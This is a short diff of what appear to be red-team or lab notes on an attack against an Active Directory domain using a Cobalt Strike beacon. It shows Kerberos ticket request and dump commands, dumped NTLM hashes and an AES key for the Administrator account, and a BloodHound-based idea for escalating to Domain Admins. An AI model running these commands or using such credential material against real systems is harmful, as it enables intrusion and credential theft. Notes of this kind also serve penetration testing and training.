@@ -266,3 +266,10 @@ beacon> krb_asktgs /service:cifs/enc-jmp-1.contoso.enclave /targetdomain:contoso
 SYSTEM on enc-jmp-1
 
 [04/30 20:50:26] beacon> krb_dump /luid:3e7 /service:cifs
+
+maybe lets try with Administrator RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 0dde0e62341ba59c5520fab03d0d06bd, 31d6cfe0d16ae931b73c59d7e0c089c0
+  AES? 944d3480bfaff5b385ff3422fac8fd13a3caab0f0f7ed241b0e5c8970a3c844a
+
+bloodhound seems to think that being the admin group gives us writeDACL over domain admins?
